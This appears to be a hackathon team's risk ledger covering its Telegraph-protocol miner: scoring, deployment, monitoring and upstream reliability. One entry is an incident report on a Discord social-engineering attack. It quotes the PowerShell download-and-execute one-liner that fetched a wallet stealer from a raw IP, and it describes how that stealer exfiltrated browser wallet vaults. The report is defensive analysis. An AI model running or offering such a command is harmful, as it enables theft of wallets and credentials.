# GAPS.md — honesty ledger

What we do not know, have not verified, or have deliberately left undone. Feeds the README's
"Assumptions & Limitations" and stops unknowns from being quietly rounded to "fine."

Status: `OPEN` unresolved · `CHECKING` in progress · `CLOSED` resolved, with the answer

---

## Blocking

### G1 · Which intent to claim — `CLOSED: SSL_VERIFICATION`
Decided on occupancy **and scoring tier** → [track1-miner/docs/INTENT_OCCUPANCY.md](track1-miner/docs/INTENT_OCCUPANCY.md).
Tier A (exact match), 3 incumbents, all three with exploitable weaknesses. The zero-occupancy
intents turned out to be Tier B (LLM-judged) and were rejected for it.


### G2 · Runtime for TLS inspection — `CLOSED: Node, not Workers`
Confirmed by spike: Workers' `fetch` does not expose peer certificates; Node's
`tls.connect()` + `getPeerCertificate()` does, and was verified working against the full
badssl.com suite (valid, expired, self-signed, hostname-mismatch, untrusted-root, unreachable).
Hosting is therefore Node on an always-on machine — `fly.toml` pins `min_machines_running = 1`
precisely because scale-to-zero would read as spot-check failure (A3).

### G3 · Assumption that weather would be crowded — `CLOSED (confirmed)`
`WEATHER_CHECK` 8 miners, `WEATHER_FORECAST` 9 — among the most contested on the board. The
"avoid the docs' example" thesis holds.

Recorded alongside it: the **`ONCHAIN_TX_LOOKUP` suggestion was wrong** — 10 miners, tied
second-most crowded. Picking by domain familiarity would have bought a rank-4 zero. Crypto-native
intents are where crypto-native entrants cluster.

## Unverified protocol facts

### G4 · How answers are scored — `CLOSED (and the original answer was wrong)`
Scoring is a sandboxed WASM module receiving **three plain strings** — `question`, `ground_truth`,
`miner_answer` — and returning an f32 in [0,1]. That much held.

**Both conclusions drawn from it were wrong, and measurement killed them (2026-08-27):**

- *"Verbose answers are penalised, so keep `reason` terse."* Wrong. Fuller answers win, provided
  every added fact was asked for. Naming the ISP in a geolocation answer moved it 0.0103 → 0.9936.
  Trimming the SSL answer on the terseness premise cost 11% and was reverted.
- *"The champion module is not published, so this is inference, not fact."* Wrong. Every intent's
  champion is listed at `/api/wasm` as commit-pinned WASM, and `/scores?intent=X` returns the real
  questions, ground truths and the exact `converted_answer` that was scored. Running the champion
  locally **reproduces the reported score exactly** — we matched all 8 epoch-286 scores. It is now
  fact, and it is our main tool.

One correction that matters more than either: the scorer reads **`converted_answer`**, Telegraph's
prose conversion of our JSON — not the raw JSON and not `label_field`.

Superseded scoring model: `track1-miner/tools/score-sim.mjs` encodes the dead terseness theory. Do
not use it. Use `tools/bench-champion.mjs`.

### G5 · `example-miner.yaml` — `CLOSED (does not exist where the docs say)`
Not in `telegraph-usecases` — that repo contains six reference **Track 3 applications**, not miner
YAMLs. `telegraph-examples`, cited in the scoring-module docs, returns 404. The file may be
private or unpublished.

Mitigated: `miner.yaml` was written against the field reference and passes a local strict-schema
precheck (top-level keys, `endpoints[]` keys, `signal_mapping` keys, slug pattern, base_url scheme).
The authoritative check remains the sandbox at integrate.telegraphprotocol.com before we spend gas.

### G6 · Truncated doc pages — `OPEN`
Both [YAML Configuration] and [Registering as a Miner] were read at a character cap and cut off
mid-section — the tail of the validation-failures table and the troubleshooting table respectively.
Something in the cut region may matter.
**Resolve:** re-read the tails, or pull the markdown from the docs repo.

### G7 · Base Sepolia access — `CLOSED`
Wallet funded (0.005 ETH), registration sent and confirmed, miner active. The console handled RPC,
so no Alchemy key was ever needed.

### ~~G7 (original)~~ — `OPEN`
Registration needs an RPC endpoint (docs show Alchemy) and testnet ETH for gas. Neither exists yet.
Also unverified: whether the web console handles RPC itself, making this moot for the console path.

## Deliberately out of scope

### G8 · Track 2 and Track 3 — `CLOSED (excluded)`
Script Author and Application tracks are not being attempted in H1. Recorded so the choice reads as
a decision rather than an oversight. Track 3 opens Aug 31 and needs live miners; revisit for H2.

### G9 · `on_chain` block omitted — `CLOSED (excluded)`
Per ARCHITECTURE A9. Cost: our miner **cannot be targeted by ERC-8183 on-chain jobs at all** — the
node has no way to build the call without `on_chain.request`. We serve HTTP and WebSocket traffic
only. Accepted for H1; this is a real capability we are giving up, not a no-op.

### G10 · Monitoring — `CLOSED, with a corrected residual`
`tools/watch.mjs` polls both our endpoint and `/api/miners/<registrationId>`; exits non-zero on a
terminal rejection. `.github/workflows/uptime.yml` runs it from outside our machine and opens an
issue on failure — the rules require the miner live through Sep 7, and a closed laptop is not a
monitoring strategy. `tools/verify-deploy.mjs` gates registration on a full acceptance pass and
was re-run green against production on 2026-08-29 (exit 0, median 372ms, p95 1172ms).

**Residual — and the earlier number here was wrong.** This entry claimed "15-minute polling …
unnoticed for up to 15 minutes". The workflow has since been changed to an hourly cron precisely
because GitHub throttles schedules, and the *observed* cadence is slower still. Measured gaps
are in **G21**, which supersedes this paragraph.

## Process risks

### G11 · Judging weights social reach, and we have no plan yet — `OPEN`
Every track lists "Progress updates posted on X" and "Engagement & reach on those posts" as
criteria. Track 1 additionally counts "number of applications built on your Miner" and "total
requests served" — both demand-side, neither controlled by code quality.
[docs/BUILD_IN_PUBLIC.md](docs/BUILD_IN_PUBLIC.md) sketches a cadence; it is not being executed yet.
**Honest read:** this is the part most likely to be neglected and it is weighted like the rest.

### G12 · Hackathon rules — `CLOSED` → [docs/JUDGING.md](docs/JUDGING.md)
Worth having read early: it corrected our deadline by a week (Track 1 closes **Aug 31**, not Sep 7),
revealed the exact scoring split (**75% performance / 25% X**), and surfaced G13 below.

### G13 · Intent may not be prize-eligible — `OPEN, mitigated two ways` · **highest-severity risk**

**Sharpened 2026-08-26 by live data:** `SSL_VERIFICATION` has **17 lifetime requests** across the
whole network. The 100-request floor is not a formality there — it is most likely unreachable
without manufacturing the traffic ourselves. Mitigated by breadth: the miner now also serves **`STORM_ALERT`** (334 requests, 3 miners) and
**`WEATHER_FORECAST`** (941 requests — the network's highest — 9 miners, all scoring under 0.008),
giving three independent eligibility paths instead of one. See [docs/MARKET_DATA.md](track1-miner/docs/MARKET_DATA.md).

> An Intent must have at least 3 active Miners **and receive at least 100 real requests from
> Track 3 applications** to be eligible for global cash prizes.

`SSL_VERIFICATION` clears the first condition (4 miners once we register). The second is
**entirely outside our control**: it depends on other people choosing to build applications that
check SSL certificates. We can hold rank 1 with a flawless score and win nothing.

**Mitigation built:** [app/](track3-certwatch/) — CertWatch, a TLS expiry monitor. It uses the **auto-routed**
engine endpoint so Telegraph's own router classifies each query, meaning demand lands on the intent
rather than being aimed at our miner. It counts `SSL_VERIFICATION`-classified requests separately.
Bounded honestly per rule 04: a certificate monitor has a real reason to check certificates
repeatedly, and being routed to a competitor is an accepted outcome.

**Residual risk:** 100 requests may still not be reachable from one app used by one person, and
**self-generated demand is the weakest kind** — the rules say requests must come "from Track 3
applications", which we satisfy literally, but the spirit is real adoption. Getting other people to
use CertWatch (T4b.4) matters more than running it ourselves. We also still cannot verify the
current per-intent count — no public counter has been found. This remains the single most likely
way the project produces excellent work and zero prize.

**Measured again 2026-08-29 — both halves confirmed, neither improving.**

```
intent                 miners   floor
SSL_VERIFICATION          5     OK
STORM_ALERT               6     OK
WEATHER_FORECAST         12     OK
IP_GEOLOCATION            2     BELOW 3      livecert + iplocate only
LANGUAGE_TRANSLATION      3     OK
ACADEMIC_SEARCH           3     OK

total_requests_served (our registration, all six intents combined): 42
```

Two things that entry did not previously state plainly. The **42** is the miner's lifetime total
across *all six* intents, while the floor is **100 per intent** — so the shortfall is not "58 more
requests", it is roughly 600 across the board, two days before the Aug 31 close, with Track 3 not
yet open. And `IP_GEOLOCATION` fails the *first* half of the rule as well, so our rank 1 there is
worth nothing on its own terms regardless of demand. The operator decided on 2026-08-28 not to
register a second miner from another account; that decision stands and this is its cost, recorded.

### G15 · We published a wrong competitive claim internally — `CLOSED (retracted)`
We asserted across three documents and a draft X post that the rank-1 incumbent was beatable
because Render cold-starts. Measurement: **675ms cold, 324ms warm — no cold start**, because
validators spot-check every ~20s and keep it warm. The competitor also does a real TLS handshake,
so our "handshake vs CT logs" edge applies to `certspotter`, not to them.

Retracted everywhere. Recorded because the failure mode is the point: it was an inference stated
as a fact, repeated until it felt established, and one `curl` disproved it. Measure claims about
competitors **before** they reach a public post.

### G14 · x402 docs are drifted from the shipped SDK — `CLOSED (worked around)`
The docs show `createSigner` from `@x402/evm`; the published package (2.23.0) exports
`toClientEvmSigner(account, publicClient)` instead, and `wrapFetchWithPayment` takes an
`x402Client` built via `x402Client.fromConfig({schemes:[...]})` rather than a bare signer. Also
needs `viem`, which is ESM-only — so the app is ESM while the miner stays CommonJS.
Resolved by reading the shipped `.d.ts` files rather than the docs. Worth remembering: **the
Telegraph docs lag their own SDK**, so verify against the package, not the page.

### G16 · The protocol node is a single point of failure for us — `OPEN`
`devnode.telegraphprotocol.com` was fully unreachable for at least three consecutive 20s probes on
2026-08-26 while our own miner served normally. Everything we depend on for *observability* —
activation status, catalog, intents, scores — runs through that one host, and so does the
registration console.

Implications we cannot engineer away:
- A node outage during the grace period may cost us scored epochs through no fault of ours.
- `updateMiner` (the pending IP_GEOLOCATION addition) cannot be executed while it is down.
- Our uptime workflow polls `activation_status` through the same host, so a node outage will look
  like a miner problem in our own alerting. Worth distinguishing in `tools/watch.mjs` if it recurs.

### G17 · CertWatch paid endpoints were unauthenticated — `CLOSED`
Found by the Codex review: `POST /api/check` and `POST /api/domains` triggered paid Telegraph
calls with no authentication, so a funded wallet was a public drain button.

Three independent layers now, because each fails differently: a constant-time `ADMIN_TOKEN`
check stops strangers; a fixed-window rate limiter stops a loop from whoever holds the token; and
`MAX_PAID_CALLS_PER_DAY` bounds the worst case regardless. **The cap defaults to 0**, so a
deployment without a deliberate budget cannot spend anything at all.

Verified in production: all three paid routes return 503 while `ADMIN_TOKEN` is unset, and
`/api/state` now publishes `writesEnabled`, `paidCallsToday`, `paidCallsPerDayCap`.

### G18 · CertWatch state is ephemeral and sweeps do not run on Vercel — `CLOSED (reopened 2026-08-28, then actually closed)`
Fixed by moving both responsibilities out of the serverless app rather than adding a database.
The sweep runs in `.github/workflows/certwatch.yml` on a 6-hourly cron and **commits its results
to `app/data/history.json`** — git is the durable record, Actions is the scheduler, and neither can
silently lose a paid result. The app now reads that committed file over HTTP and reports
`historySource: "committed" | "instance"` so it is obvious which it is showing.

The workflow gates on `EVM_PRIVATE_KEY` being present as a repository secret and exits cleanly when
it is not, so an unfunded repo does not fail a scheduled run every six hours.

**Reopened 2026-08-28 — the above was true of the design and false of the deployment.** Root
`.gitignore` contained a bare `data/`, which matches `track3-certwatch/data/` at any depth. So the
committed-history mechanism could never have worked: `git add` silently refused the file,
`git diff --quiet` saw no tracked change and the workflow logged "no change" on every run. The file
was never pushed, `raw.githubusercontent.com/.../track3-certwatch/data/history.json` returned
**404**, `loadCommittedHistory()` fell through to `null`, and production reported
`historySource: "instance"` — ephemeral, exactly the condition G18 claimed to have fixed. The
workflow was green only because no wallet is configured and it skips the paid work entirely.

A green CI check and a closed gap are not the same thing. This one was closed on the strength of
the design without a read-back through the real path.

**Actually fixed 2026-08-28:** `.gitignore` now negates the path (`!track3-certwatch/data/` then
`!track3-certwatch/data/history.json` — the directory must be re-included first or the file
negation cannot apply), and `history.json` is tracked, so the raw URL resolves. Verified: the file
is staged as `A`, where before the same `git add` was a no-op.

**Still open, and it is the part that matters:** no sweep has yet written a record through the real
path, because `EVM_PRIVATE_KEY` is unset and CertWatch has no outside users. The mechanism is
proven; the demand is not. See `track1-miner/docs/ELIGIBILITY.md` §4.

### ~~G18 (original)~~
Also from the Codex review. `track3-certwatch/src/store.ts` writes to `/tmp`, which a serverless instance does
not keep, and `track3-certwatch/src/server.ts` disables the background sweep loop under Vercel because a frozen
instance never fires an interval. So CertWatch currently has no durable history and no scheduler.
**Fix:** move state to a real store and drive sweeps from a scheduled GitHub Action hitting the
authenticated endpoint, rather than an in-process timer.

### G20 · The `scores` CI job and local sessions both commit to `main` — `RESOLVED 2026-08-29, prevention still open`
Verified 2026-08-29 (session 2): `git rev-list --left-right --count origin/main...HEAD` returns
`0 0` — the divergence was reconciled and pushed; both epoch-289 lines are in the history. The
**prevention** half remains: nothing stops the same race recurring. Until CI solely owns
`score-history.jsonl`, run the divergence check before any git operation. The original record:

Found 2026-08-29. The `scores` job in `.github/workflows/uptime.yml` runs `record-scores.mjs`,
commits `track1-miner/docs/score-history.jsonl` and **pushes to `main`**. A local session that
records the same epoch by hand writes the same file. On 2026-08-29 both happened: the runner
pushed epoch 289 at 16:41Z, a local commit recorded epoch 289 at 13:15Z, and the branches
diverged — **local 8 ahead, remote 1 ahead**, with both sides appending a line to the end of the
same file. The data was identical; only the `at` timestamps differed.

Why it matters more than it looks:
- The next `git push` is rejected, and the obvious reflex — `--force` — silently deletes the
  runner's epoch record. The score history is the only durable per-epoch evidence we have, because
  the API exposes just the latest epoch.
- Until it is reconciled, eight commits of session work exist **only on the operator's laptop**,
  and that is the machine whose wallet seed is compromised (G19).

**Resolve:** rebase local onto `origin/main`, keep *both* epoch-289 lines in timestamp order
(readers take the last line per epoch, and the data agrees), then push. Do not force-push.
**Prevent:** either stop recording epochs by hand and let CI own that file, or have the job write
to a per-run file instead of appending to a shared one.

### G21 · The uptime tripwire is slower and narrower than it claims — `NARROWER half RESOLVED 2026-08-29; STICKY half RESOLVED 2026-08-31; SLOWER half accepted`
**Sticky, found 2026-08-31.** The alarm opened issues but nothing ever closed them. Issue #2
was raised by two transient failures on 2026-08-30 (16:44 and 19:51 — the badssl.com /
Open-Meteo blips the CI comment already warns about) and stayed open through three clean runs
afterwards. That is worse than a missing alarm: the `alarm` step reuses `existing[0]`, so one
stale issue silently downgrades every later outage into a comment on a thread nobody is
watching. A `resolve` job now closes any open `uptime` issue on a clean run, so an open issue
means "failing right now" and the next real failure opens a fresh one.

Resolved 2026-08-29 (session 2): a single `alarm` job with
`needs: [check, live-tests, scores]` now opens or extends the `uptime`-labelled issue when **any**
job fails, permissions are explicit, and the path was **proven live** — a forced failure via the
new `test_alarm` dispatch input created issue #1 (the repo's first ever), which was then closed as
a documented drill. The **slower** half stands: the cron's real cadence is still up to ~13h and
cannot be bought back with cron syntax; `live-tests` now caches its npm install to conserve the
private-repo Actions quota, which is the suspected throttling cause but is unproven. The original
record:

Found 2026-08-29, while checking that G19's accepted risk is actually covered.

**Slower.** `uptime.yml` is an hourly cron and its own comment says the observed cadence is "one
run every two to three hours". Measured from the run history, the real gaps are worse:

```
2026-08-27T18:18Z  ->  2026-08-28T03:35Z    9h 17m
2026-08-28T03:35Z  ->  2026-08-28T16:41Z   13h 06m
```

So the detection window for a malicious `deregisterMiner` — the specific event G19 accepts the
risk of — is up to **half a day**, not the "hourly" the file implies. GitHub throttles scheduled
workflows on free runners and there is no way to buy back that latency with cron syntax alone.

**Narrower.** Only the `check` job has the "Open an issue if the miner is down" step. The
`live-tests` and `scores` jobs have no alerting path at all: `live-tests` failed on 2026-08-27
(stale `working-directory: miner`, left behind by the per-track folder split) and produced nothing
but a red tick. The repository has **never had an issue created, open or closed** — so the alerting
half of this mechanism has never once been observed to work end to end.

**Resolve:** move the issue-opening step to a `needs: [check, live-tests, scores]` job with
`if: failure()` so any job alerts; and fire the alert once deliberately to prove the path works,
rather than trusting it on first use. Correct the cadence comment in the workflow to the measured
figures. A green tick is not evidence of a working alarm — the same lesson G18 already cost us.

### G22 · Pushing to `main` does NOT deploy — production only updates via `vercel --prod` — `CLOSED as a fact, recorded so it is never re-assumed`
Found 2026-08-29 (session 2): the storm-guidance commit was pushed and production still served the
old answer 10 minutes later; `vercel ls` showed the newest deployment was **23 hours old**. There
is no GitHub→Vercel integration on this repo. Every deploy is an explicit
`vercel --prod` from `track1-miner/miner` (CLI is authenticated as the operator's team `wukong4`).
This corrects MEMORY's earlier claim that "Vercel builds api/index.ts from source on push" — code
merged to `main` is NOT live until someone runs the CLI. Any session that lands a scoring-relevant
change must deploy and then re-run `verify-deploy` against production, or the change does nothing.

### G23 · The storm advisory guidance's survival through the prose converter is unmeasured — `OPEN`
2026-08-29 (session 2). The standing operational-guidance sentence appended to storm answers
measured +36% on the epoch-289 advisory question and −2 to −3% on the three prior forecast
questions — but those are **raw-prose** scores. What is actually scored is `converted_answer`, a
~32-word LLM summary we cannot run offline, and MEMORY records that what the converter reaches
last is what it drops. The guidance sits at the tail, so the likeliest live outcome on forecast
questions is "dropped, no effect", and on advisory questions "partially kept, some gain" — but
neither is measured. Epoch 290+ storm rows are the evidence; read them before concluding anything.

### G24 · The `/scores` feed no longer returns questions, ground truths or converted answers — `OPEN, and it is the worst of these`
2026-08-30. Every real finding in this repo came from `/scores?intent=X`, which returned
`question`, `ground_truth`, `miner_answer` and `converted_answer` alongside the score — documented
in `track1-miner/docs/codex-worklog/2026-08-26-live-scoring-recon.md`. **As of 2026-08-30 it returns
only** `id, epoch_id, intent_id, miner_slug, rank, score, failure_reason, scored_at, created_at`.
Checked and failed: `?verbose=1`, `?include=answers`, `/scores/<id>`, `/api/scores`,
`/engine/v1/scores`. Consequences: the champion WASM can no longer be validated against reported
scores; epoch questions cannot be read after the fact; `tools/*_bench.json` and `tools/corpus.json`
are now a frozen snapshot of questions captured while the feed was open and **cannot be refreshed**.
All offline tuning from here is against a fixed corpus that may drift away from the node's live
fixtures. The `explorer.telegraphprotocol.com/api/daemon/api/questions` feed still carries real
routed questions with answers and is the only remaining live source of question text — it is not a
substitute, because it is not the scoring fixture set.

### G25 · The restatement's survival through the prose converter is simulated, not measured — `OPEN`
2026-08-30. The restate-the-request change (EPOCH_292_AUTOPSY.md) measures 8.1x / 18.8x / 20.4x on
raw prose against the live champion scorers. What is actually scored is `converted_answer`, a
~32-word summary we cannot run offline — the same limitation as G23. The proxy used was naive
first-32-words truncation, which is **not** what the converter does: it rewrites into flat "The
data…" prose. The direction is consistent at every truncation length tested (32, 24 and 17 words
all improve SSL and storm), so the sign of the effect is not in doubt; the magnitude is. Epoch 293
is the measurement. **Storm is the one to watch**: four of twelve storm questions score 7-15% lower
on full prose, we hold storm by 0.7%, and only the 32-word column is unanimous there.

### G26 · The bare-translation answer shape is tuned to a champion that has changed twice in a week — `OPEN`
2026-08-30. `/translate` now answers with the bare translation and no restatement — measured 9/10
cliff crossings under the current champion (reg 1996, `language_translation_w1.wasm`, activated
2026-08-30) against 8/10 for the rank-1 incumbent, over all ten distinct recorded questions. Two
caveats. First, this intent's champion has now changed twice (c2_r1cut reg 1885 → w1 reg 1996),
and the two regimes **invert** each other: under c2_r1cut the bare shape measured 8.5e-5 and the
sentence form 0.33; under w1 the sentence-plus-provenance form crosses 3/10 and bare 9/10. If the
champion changes again, re-measure before trusting anything in `translate.ts`. Second, epoch 294
was scored before w1 activated, so **epoch 295 is the first live test** — and the converter (G25)
applies here too: nobody has measured what an English prose summarizer does to a bare CJK reason.
Note the current champion is our own Track 2 submission; the miner answer was tuned to it the same
way every miner tunes to every champion — by measuring — and the answer itself is exactly the
translation the question asked for.

### G27 · ip-api.com is unreachable from the dev machine, so its production behaviour is verified only on production — `CLOSED 2026-08-30: verified live`
2026-08-30. `geo.ts` now tries ip-api.com first (it honours operator geofeeds; ipwho.is placed
Google's 142.251.42.174 in Mumbai where the recorded ground truth and Google's own geofeed say
Japan). The dev machine's ISP blocks TCP to ip-api.com entirely — DNS resolves, connections time
out, on both 80 and 443 — so **every local bench row for public IPs exercised the ipwho.is
fallback**, and the local 14/21 result is the floor, not the measurement, for the deployed chain.
Verified after deploy the same day: production answers 142.251.42.174 with "Chiyoda City, Tokyo,
Japan" via ip-api, and verify-deploy passes with median 487ms — ip-api is reachable from Vercel.
Residual: if ip-api ever becomes unreachable from Vercel, the chain falls through to ipwho.is and
behaviour matches pre-change production plus up to 4s of added latency per uncached public-IP
request (per-provider budget is 4s; worst case three providers = 12s against Vercel's 15s ceiling).
Remember the benches for this intent cannot exercise ip-api from this machine — measure against
production, not localhost, whenever the provider matters.

### G28 · Three new intents are declared in the manifest but not yet signed on-chain — `OPEN, operator action`
2026-08-31. `/extract`, `/headlines` and `/wallet-balance` are **live in production and verified**,
and `miner.yaml` declares CONTENT_EXTRACTION, NEWS_HEADLINES and WALLET_BALANCE_CHECK — but
registration **334 still carries only seven intents** until an `updateMiner` is signed. Until then
the three routes serve nothing: no traffic is routed to an intent a registration does not declare.
The gap is deliberate (Claude never signs) and the runbook is
`track1-miner/docs/ADD_THREE_INTENTS.md`. **Risk if it is never signed:** none to the seven live
intents; the work simply sits idle. **Risk if signed badly:** a rejected activation takes all ten
offline, which is why the code went live first and why a manifest test now fails the build when
endpoint intents and `supported_intents` disagree.

### G29 · Two intents we serve are scored by champions authored from our own wallet — `OPEN, disclosure`
2026-08-31. The LANGUAGE_TRANSLATION champion (reg 1996) and the CVE_LOOKUP champion (reg 1993) are
authored by `0xdad201ef02…`, which is **the same wallet that operates this miner**. That is a
legitimate consequence of competing in Track 2 as well as Track 1, and Track 2's own rules forbid
miner-favouring scorers — but it should be disclosed rather than discovered. The strongest evidence
that these scorers are not tuned for us: **our own translation miner ranked LAST (4 of 4) under our
own translation champion in epoch 295**, and we declined to enter CVE_LOOKUP after measuring only
0.4998 under our own CVE champion. Worth stating plainly in any submission write-up.

### G19 · The miner wallet's seed phrase is compromised — `OPEN, accepted risk`
2026-08-28. The operator was social-engineered in a hackathon Discord DM by an account named
`ADMINS {NEVER DM FIRST}` — the name copies the label real servers use to warn that admins never
DM first — and ran:

```
iwr -useb http://170.205.30.207/usertroubleshoot.ps1 | iex
```

The script was retrieved as text and analysed (never re-executed). It is a narrow wallet stealer:
it walks every Chrome profile, copies the `Local Extension Settings` vault for MetaMask, Phantom
and Rabby, prompts for the wallet password and writes it in plaintext, zips both, POSTs to
`http://170.205.30.207:3000/upload`, then deletes the staging folder. The staging folder was
already gone when checked, so the upload path completed.

**Scope, verified on the machine:**
- **Five Chrome profiles** hold MetaMask vaults (`Default`, `Profile 1`, `Profile 9`, `Profile 10`,
  `Profile 12`). Vault + password = seed phrase. Treat every seed in those profiles as lost, and
  the encrypted vaults as brute-forceable even where no password was typed.
- **No persistence.** No scheduled task, Run key or startup entry was created; all present entries
  are legitimate. It runs once and exits.
- **It does not read** the GitHub token, Vercel token, SSH keys, `.env` files, saved browser
  passwords or cookies. Those were **not** rotated, deliberately — rotating them would have been
  an hour of work against a threat that does not exist here.
- Chrome only. Edge, Brave and Firefox were untouched.

**Caveat:** `iex` executed whatever that host served at that moment; the analysis is of what it
served afterwards. Observed behaviour matched (password prompts, folder created then removed) and
the absence of persistence corroborates it, but this is not a byte-identical guarantee.

**Why this is a project risk, not just a wallet risk.** `0xdAd2…A39E` owns registration **260**.
Whoever holds that seed can call `deregisterMiner(260)` for the price of gas and delete the Track 1
entry — four rank-1 positions and six intents. On-chain state checked the same day: nonce 3, which
matches only our own registrations, and 0.0 native balance on Ethereum, Base and Arbitrum mainnet.
**Nothing has been touched.**

**Accepted rather than mitigated, deliberately.** Re-registering from a clean wallet three days
before the close would mean a new registration id, a fresh rejection risk, and losing the running
score history — for protection against an attacker who gains nothing by acting. Drainers are
automated and profit-motivated; deleting a testnet miner earns them nothing.

**What a fresh session should know:**
- `.github/workflows/uptime.yml` polls registration 260 every 15 minutes and opens an issue if
  `activation_status` changes. That alerting is now load-bearing. **If the miner is ever found
  deregistered, this is the likely cause — re-register from a clean wallet, do not assume a
  protocol fault.**
- Do not use those seeds for anything after the hackathon.
- The same Discord contact also pushed a fake "Vercel dapps mainnet wallet validation" flow. There
  is no such thing. No legitimate Telegraph step needs a PowerShell script or a seed phrase.

---

### G30 · Six routes discarded the engine's declared subject when `query` paraphrased it — `CLOSED 2026-08-30: fixed, deployed, regression-tested`

Telegraph fills the parameters `miner.yaml` declares **and** may send `query`. `firstValue`
returns the first populated parameter, so every route listing `query` ahead of its own declared
subject threw that subject away whenever both arrived. Harmless while `query` is the verbatim
question. Wrong when it is a paraphrase — "this wallet", "there", "this subject".

Found by calling production the way the engine does, not the way a human does — which is why
neither the unit tests nor `verify-deploy` had ever caught it. Measured on the live deployment:

```
/wallet-balance   address + "balance of this wallet?"      -> refused: invalid_address
/weather-forecast location=London + "forecast there?"      -> refused: invalid_location
/translate        text+lang + "Translate it."              -> refused: invalid_input
/extract          text + "Extract the contact details."    -> "no contact details were found"
/papers           topic=CRISPR + "papers on this subject"  -> NEUROIMAGING papers, confidently
/storm-alert      location=Chennai + "storm risk there?"   -> TERESOPOLIS, BRAZIL, confidently
```

The four refusals are guaranteed zeros — the same shape as epoch 288's weather loss. The last two
are worse than zeros: they are the confidently-wrong answers ARCHITECTURE A5 and the SPORTS_SCORE
precedent exist to prevent, and they were being served on `STORM_ALERT`, an intent we lead.

**Fix:** `withSubject` restores the subject only when it is **absent** from the question, so a
verbatim query yields byte-identical output and no scored surface moves on the intents we lead.
A regression test pins that byte-identity. `/translate` cannot append — its request has two halves
— so it falls back to the composed form when the query no longer carries the text.

**Unproven but worth stating: this may be the ACADEMIC_SEARCH regression.** `/papers` returned
unrelated papers on paraphrased questions, and that intent fell from ratio 1.000 across epochs
289/291/294 to **0.740** in 295. Consistent with the data, but G24 hides the converted answers, so
it cannot be confirmed — only watched in epoch 296.

Guarded by `tools/param-shapes.mjs` (55 cases, exits non-zero).

### G31 · A hung upstream became a platform 504, which scores the same as a 400 — `CLOSED 2026-08-30: fixed and deployed`

`vercel.json` caps the function at 15s. Past that Vercel returns a **504**, and Telegraph records
any non-2xx as an upstream error with an empty `miner_answer` — a guaranteed 0. Several routes
could reach that ceiling when an upstream hung rather than failed: `/storm-alert` geocodes
candidates sequentially at 8s each *before* fetching a forecast, `/wallet-balance` walks four RPCs
at 6s, `/translate` tries two providers at 8s.

A watchdog armed at 11s now answers honestly that the upstream did not respond in time — truthful,
a 200, and scoreable text. `send()` is idempotent so a late provider cannot write a second response
to a closed socket.

**Not measured:** how often this actually fired in past epochs. Production median is ~430ms and no
recorded failure row names a timeout on our side, so this is insurance against a tail, not a
diagnosis of a known loss.

### G32 · `polygon-rpc.com` is dead and was the primary Polygon endpoint — `CLOSED 2026-08-30: replaced`

HTTP 401, "API key disabled, reason: tenant disabled". Every Polygon or MATIC wallet question was
one failover away from unanswerable. Replaced with publicnode / drpc / 1rpc, cross-checked against
each other on the same address. Also dead and named in the code so they are not retried:
`rpc.ankr.com/polygon` (auth), `polygon.llamarpc.com` (no response),
`polygon.blockpi.network` (521), `polygon-mainnet.public.blastapi.io` (retired).

**Still degraded:** `ipapi.co`, the **third**-tier geolocation failover, answers 429. The primary
(`ip-api.com`) and second (`ipwho.is`) are healthy, so this is recorded, not acted on. It means the
next geolocation outage has one fewer endpoint behind it than the code implies.

Guarded by `tools/upstream-health.mjs` (23 providers, exits non-zero when a primary is down).

### G33 · The synchronous paths had no error boundary — `CLOSED 2026-08-30: boundary added; nothing was actually throwing`

Every asynchronous path in `handler.ts` already ended in a `.catch()` that answers honestly, but
the synchronous ones had nothing: `new URL()` on a malformed request line, a parser inside
`extractContent` or `detectAiText`, a regex on hostile input. Any throw there becomes a **500**,
and Telegraph scores a 500 exactly as it scores a 400 — upstream error, empty `miner_answer`,
nothing for the scorer to read.

**Nothing is throwing today.** 180 hostile inputs across all ten routes — 8KB payloads, mixed
scripts and RTL overrides, lone surrogates, control characters, script tags, 400-digit numbers,
malformed percent-encoding — all returned 200 with a non-empty answer. The boundary is insurance
against a future parser change, not a diagnosis of a known loss, and it is recorded that way.

**Tested and NOT a risk, so nobody re-opens it:** a single parameter carries **32KB** fine, far
past any realistic inline `CONTENT_EXTRACTION` or `AI_TEXT_DETECTION` payload; a real 5,940-character
passage is served in under 700ms. The 414s an earlier version of the probe produced were its own
artifact — it put the same 8KB into twelve parameter names at once, building a URL Vercel's edge
rejects before our function is ever invoked. The engine does not do that.

Guarded by `tools/hostile-inputs.mjs` (180 probes, exits non-zero).

### G34 · The uptime tripwire was red for two days because a test fix was never pushed — `CLOSED 2026-08-30: pushed, workflow green`

`uptime` runs `check`, `live-tests` and `scores`, and its `alarm` job opens an issue when any of
them fails. G19 calls that alerting **load-bearing** — it is the tripwire for the compromised
wallet seed. It had been failing on `live-tests` (44 pass, 1 fail) since 2026-08-29 on the DNS
timeout race the seven-intent audit describes. The fix existed locally and had simply never been
pushed, so the alarm was firing on its own broken test rather than watching the miner.

Pushed with this session's six commits. `uptime` is now green end to end — check, live-tests and
scores all pass, alarm correctly skipped. Locally `npm run test:live` is 52/52.

**Separate and still red, and deliberately not touched:** the `ci` workflow fails in its
`track2-scorer` job on `release identity mismatch: 32311 bytes e5faf4ca…` — the built
`dist/text_authenticity.wasm` no longer matches the sha256 pinned in
`track2/release/text-authenticity.json`. **Track 1's `miner` job passes green**, as does `app`; only
Track 2's job is red, and this file's rules forbid editing `../track2/`. It is recorded here so the
red X on `ci` is not mistaken for a Track 1 failure — but a Track 2 session should fix it, because a
release-identity mismatch on a submitted scorer is not cosmetic.

**Also observed, and it is the reason the design is what it is:** running all five gates
back-to-back made `verify-deploy` fail once on a transient upstream, then pass three times in a row
unchanged. The upstreams flap under concurrent load. That is precisely the case the 11s watchdog
(G31) and the honest-200 rule exist to absorb — but it means a single red run is not evidence of a
defect, and a gate should be re-run before it is believed.

### G35 · `/ip-geolocate` loses the restatement when the engine fills `ip` — `OPEN, deliberately not changed before the close`

It is the only route that reuses its subject parameter as the question it restates:

```
const q = firstValue(url, "ip", "address", "query", "q", "question", "text", "input");
```

so when the engine fills the **required** `ip` parameter, `q` is the bare string `"8.8.8.8"` and
`sendAnswer` restates against that rather than against the question. Measured on production, the
same question answered two ways:

```
query only        "Regarding where is 8.8.8.8 located and does it have any abuse history: The IP
                   address 8.8.8.8 is associated with Google Public DNS (AS15169)..."
query + ip        "The IP address 8.8.8.8 is associated with Google Public DNS (AS15169)..."
```

`/ssl-check` and `/ai-detect` both separate these two deliberately, with comments saying why, so
geo is the odd one out in its own codebase.

